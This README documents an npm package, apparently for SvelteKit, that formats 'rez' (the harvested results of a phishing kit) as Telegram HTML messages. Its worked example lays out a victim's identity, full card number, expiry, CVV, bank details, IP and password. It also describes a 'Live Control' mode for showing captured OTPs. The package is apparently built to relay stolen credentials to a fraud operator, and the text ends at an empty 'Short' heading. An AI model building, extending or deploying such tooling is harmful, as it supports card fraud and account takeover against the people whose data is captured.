# @git-franckg/sveltekit-rez

Messages de rez facile.

## Installation

`yarn add -D @git-franckg/sveltekit-rez`

## Introduction

Les messages sont généré en code HTML compatible avec Telegram.

* Full : toutes les informations, comme un rez classique.
* Short (for Live Control) : affiche les informations relatif au Live Control tels que les derniers OTPs.
* Preview : Prévisualise un rez classique, sans possibilité de toucher la carte.

### Full

Input:

```typescript
const input = [
	['[ 📧 +1 EMAIL ]'],
	[
		'📍 localhost [28/04/2025 22:48:01]',
		'└ © HostRapid : [Confidential For Private Use]'
	],
	[
		['🏦', 'Info'],
		['🕵️', 'First & Lastname', 'Robert Menard'],
		['🏠', 'Address', '3 rue de bx'],
		['📮', 'Zip', '01000'],
		['📞', 'Phone', 'FR +33 6 12 34 56 78'],
		['📧', 'Email', 'email@exemple.com'],
		['🎂', 'Birthday', '10/01/2000']
	],
	[
		['🏦', 'Card Number'],
		['💳', 'Number', '4970 4000 0000 0000'],
		['📅', 'Expiration', '10/30'],
		['🔒', 'CVV', '123']
	],
	[
		['🗃', 'Card Details'],
		['🏦', 'Bank', 'La Banque Postale'],
		['🏷 ', 'Brand', 'Visa'],
		['💳', 'Type', 'Debit'],
		['💵', 'Level', 'Classique'],
		['🚩', 'Pays', 'France']
	],
	[
		['🧩', 'Extra'],
		['🏷 ', 'Bin', '#497040'],
		['📣', 'Lang', 'fr'],
		['🌍', 'IP', '::1'],
		['🖥 ', 'OS', 'Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0'],
		['🔐', 'Password', '123456'],
		['🧬', 'ID', '#9a77b05efdf2dc1495e7bfc355ee48a5a7899cdf']
	]
]
]
```

Résultat:

```
<blockquote>[ 📧 +1 EMAIL ]</blockquote>

🏦 <b>Info</b>
├ 🕵️ <i>First & Lastname</i> : <code>Robert Menard</code>
├ 🏠 <i>Address</i> : <code>3 rue de bx</code>
├ 📮 <i>Zip</i> : <code>01000</code>
├ 📞 <i>Phone</i> : <code>FR +33 6 12 34 56 78</code>
├ 📧 <i>Email</i> : <code>email@exemple.com</code>
└ 🎂 <i>Birthday</i> : <code>10/01/2000</code>

🏦 <b>Card Number</b>
├ 💳 <i>Number</i> : <code>4970 4000 0000 0000</code>
├ 📅 <i>Expiration</i> : <code>10/30</code>
└ 🔒 <i>CVV</i> : <code>123</code>

🗃 <b>Card Details</b>
├ 🏦 <i>Bank</i> : <code>La Banque Postale</code>
├ 🏷 <i>Brand</i> : <code>Visa</code>
├ 💳 <i>Type</i> : <code>Debit</code>
├ 💵 <i>Level</i> : <code>Classique</code>
└ 🚩 <i>Pays</i> : <code>France</code>

🧩 <b>Extra</b>
├ 🏷 <i>Bin</i> : #497040
├ 📣 <i>Lang</i> : <code>fr</code>
├ 🌍 <i>IP</i> : <code>::1</code>
├ 🖥 <i>OS</i> : <code>Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0</code>
├ 🔐 <i>Password</i> : <code>123456</code>
└ 🧬 <i>ID</i> : #9a77b05efdf2dc1495e7bfc355ee48a5a7899cdf

<blockquote>📍 localhost [28/04/2025 22:48:01]
└ © HostRapid : [Confidential For Private Use]</blockquote>
```

## Short


